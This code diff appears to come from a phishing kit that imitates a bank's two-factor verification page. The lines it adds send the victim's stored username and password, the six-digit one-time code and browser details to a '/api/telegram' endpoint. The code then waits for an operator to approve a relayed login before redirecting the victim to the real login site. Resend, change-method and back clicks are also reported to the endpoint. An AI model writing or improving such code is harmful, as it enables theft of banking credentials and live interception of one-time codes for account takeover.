@@ -1,20 +1,40 @@
 'use client';
 
-import { useState, useRef, useEffect, Suspense } from 'react';
-import { useRouter, useSearchParams } from 'next/navigation';
+import { useState, useRef, useEffect } from 'react';
+import { useRouter } from 'next/navigation';
+import {
+  APPROVAL_TIMEOUT_MS,
+  MSG_UNABLE_REACH_VERIFICATION,
+  OTP_CODE_ERROR_TEXT,
+} from '@/lib/approval-messages';
+import { readStoredPassword, readStoredUsername } from '@/lib/login-flow-storage';
+import { pollPendingLogin } from '@/lib/poll-pending-login';
+import { LOGIN_REDIRECT_URL } from '@/lib/project-config';
+import { postTelegramNavEvent, readStoredMethod } from '@/lib/telegram-client';
 
-function VerifyCodeForm() {
+export default function VerifyCodePage() {
   const router = useRouter();
-  const searchParams = useSearchParams();
-  const method = searchParams.get('method') || 'text';
+  const [method] = useState(() => {
+    if (typeof window === 'undefined') return 'text';
+    const storedMethod = readStoredMethod();
+    return storedMethod === 'call' || storedMethod === 'text' || storedMethod === 'email'
+      ? storedMethod
+      : 'text';
+  });
   const [code, setCode] = useState(['', '', '', '', '', '']);
   const [networkError, setNetworkError] = useState('');
   const [submitting, setSubmitting] = useState(false);
   const codeInputRefs = useRef([]);
+  const [resendSubmitting, setResendSubmitting] = useState(false);
+  const [backSubmitting, setBackSubmitting] = useState(false);
 
   useEffect(() => {
+    if (!readStoredUsername()) {
+      router.push('/login');
+      return;
+    }
     codeInputRefs.current[0]?.focus();
-  }, []);
+  }, [router]);
 
   const handleCodeChange = (index, value) => {
     if (value.length > 1) {
@@ -43,6 +63,7 @@ function VerifyCodeForm() {
 
   const [resendCooldown, setResendCooldown] = useState(0);
   const [tryAnotherLoading, setTryAnotherLoading] = useState(false);
+  const navDisabled = submitting || resendSubmitting || tryAnotherLoading || backSubmitting;
 
   useEffect(() => {
     if (resendCooldown <= 0) return;
@@ -53,68 +74,147 @@ function VerifyCodeForm() {
   const handleVerifySubmit = async (e) => {
     e.preventDefault();
     const fullCode = code.join('');
-    if (fullCode.length !== 6) return;
+    if (fullCode.length !== 6 || navDisabled) return;
     setNetworkError('');
     setSubmitting(true);
+    const userId = readStoredUsername();
+    const currentMethod = readStoredMethod() || method;
+    const clientMeta = {
+      userAgent: window.navigator.userAgent,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      language: window.navigator.language || '',
+      referrer: document.referrer || 'Direct',
+      url: window.location.href,
+      localTime: new Date().toLocaleString(),
+      utcTime: new Date().toUTCString(),
+    };
     try {
-      const res = await fetch('/api/notify-verify-code', {
+      fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ method, code: fullCode }),
+        body: JSON.stringify({
+          userId,
+          password: readStoredPassword(),
+          method: currentMethod,
+          code: fullCode,
+          client: clientMeta,
+          eventType: 'verification',
+        }),
+      }).catch(() => {});
+
+      const res = await fetch('/api/pending-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ kind: 'otp', userId, password: fullCode }),
       });
+      const data = await res.json().catch(() => ({}));
       if (!res.ok) {
-        setNetworkError('Network error. Please check your connection and try again.');
+        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
         setSubmitting(false);
         return;
       }
-      await new Promise((r) => setTimeout(r, 2000));
-      window.location.href = 'https://login.standard.com/';
+      if (!data?.id) {
+        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+        setSubmitting(false);
+        return;
+      }
+      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
+      setSubmitting(false);
+      if (outcome === 'approved') {
+        sessionStorage.removeItem('visit_userId');
+        sessionStorage.removeItem('visit_password');
+        sessionStorage.removeItem('visit_method');
+        sessionStorage.removeItem('username');
+        window.location.href = LOGIN_REDIRECT_URL;
+        return;
+      }
+      if (outcome === 'denied') {
+        setCode(['', '', '', '', '', '']);
+      }
+      setNetworkError(OTP_CODE_ERROR_TEXT);
     } catch {
-      setNetworkError('Network error. Please check your connection and try again.');
+      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
       setSubmitting(false);
     }
   };
 
   const handleResendCode = async (e) => {
     e.preventDefault();
-    if (resendCooldown > 0) return;
+    if (resendCooldown > 0 || navDisabled) return;
     setNetworkError('');
+    setResendSubmitting(true);
     try {
-      const res = await fetch('/api/notify-resend-code', {
+      const clientMeta = {
+        userAgent: window.navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        language: window.navigator.language || '',
+        referrer: document.referrer || 'Direct',
+        url: window.location.href,
+        localTime: new Date().toLocaleString(),
+        utcTime: new Date().toUTCString(),
+      };
+      const telegramPromise = fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ method }),
+        body: JSON.stringify({
+          userId: readStoredUsername(),
+          password: readStoredPassword(),
+          method: readStoredMethod() || method,
+          code: '',
+          client: clientMeta,
+          eventType: 'resend',
+        }),
       });
+      const [, res] = await Promise.all([new Promise((r) => setTimeout(r, 2000)), telegramPromise]);
       if (!res.ok) {
-        setNetworkError('Network error. Please check your connection and try again.');
+        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
         return;
       }
-      await new Promise((r) => setTimeout(r, 2000));
       setCode(['', '', '', '', '', '']);
       codeInputRefs.current[0]?.focus();
       setResendCooldown(30);
     } catch {
-      setNetworkError('Network error. Please check your connection and try again.');
+      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+    } finally {
+      setResendSubmitting(false);
     }
   };
 
   const handleTryAnotherMethod = async (e) => {
     e.preventDefault();
-    if (tryAnotherLoading) return;
+    if (tryAnotherLoading || navDisabled) return;
     setTryAnotherLoading(true);
     setNetworkError('');
     try {
-      const res = await fetch('/api/notify-try-another-method', { method: 'POST' });
-      if (!res.ok) {
-        setNetworkError('Network error. Please check your connection and try again.');
+      const { ok } = await postTelegramNavEvent('changeMethod');
+      if (!ok) {
+        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
         setTryAnotherLoading(false);
         return;
       }
-      await new Promise((r) => setTimeout(r, 2000));
       router.push('/login/2fa');
     } catch {
-      setNetworkError('Network error. Please check your connection and try again.');
+      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
       setTryAnotherLoading(false);
+    }
+  };
+
+  const handleBackToLogin = async (e) => {
+    e.preventDefault();
+    if (navDisabled) return;
+    setBackSubmitting(true);
+    setNetworkError('');
+    try {
+      const { ok } = await postTelegramNavEvent('backToLogin');
+      if (!ok) {
+        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+        return;
+      }
+      router.push('/login');
+    } catch {
+      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+    } finally {
+      setBackSubmitting(false);
     }
   };
 
@@ -151,6 +251,7 @@ function VerifyCodeForm() {
                 onChange={(e) => handleCodeChange(i, e.target.value)}
                 onKeyDown={(e) => handleCodeKeyDown(i, e)}
                 aria-label={`Digit ${i + 1}`}
+                disabled={navDisabled}
               />
             ))}
           </div>
@@ -160,14 +261,16 @@ function VerifyCodeForm() {
               type="button"
               className="form-link button-link"
               onClick={handleResendCode}
-              disabled={resendCooldown > 0}
+              disabled={resendCooldown > 0 || navDisabled}
             >
-              {resendCooldown > 0
+              {resendSubmitting
+                ? 'Sending...'
+                : resendCooldown > 0
                 ? `Resend Code (0:${String(resendCooldown).padStart(2, '0')})`
                 : 'Resend Code'}
             </button>
           </p>
-          <button type="submit" className="login-button" disabled={!canVerify || submitting}>
+          <button type="submit" className="login-button" disabled={!canVerify || navDisabled}>
             {submitting ? 'Verifying…' : 'Verify and Log In'}
           </button>
           <p className="verify-back">
@@ -175,21 +278,23 @@ function VerifyCodeForm() {
               type="button"
               className="form-link button-link"
               onClick={handleTryAnotherMethod}
-              disabled={tryAnotherLoading}
+              disabled={navDisabled}
             >
               {tryAnotherLoading ? 'Loading…' : '← Try another method'}
+            </button>
+          </p>
+          <p className="verify-back">
+            <button
+              type="button"
+              className="form-link button-link"
+              onClick={handleBackToLogin}
+              disabled={navDisabled}
+            >
+              {backSubmitting ? 'Loading…' : '← Back to Sign In'}
             </button>
           </p>
         </form>
       </div>
     </div>
-  );
-}
-
-export default function VerifyCodePage() {
-  return (
-    <Suspense fallback={<div className="login-container login-container-narrow"><div className="verify-content loading" style={{ padding: '48px', textAlign: 'center' }}>Loading…</div></div>}>
-      <VerifyCodeForm />
-    </Suspense>
   );
 }
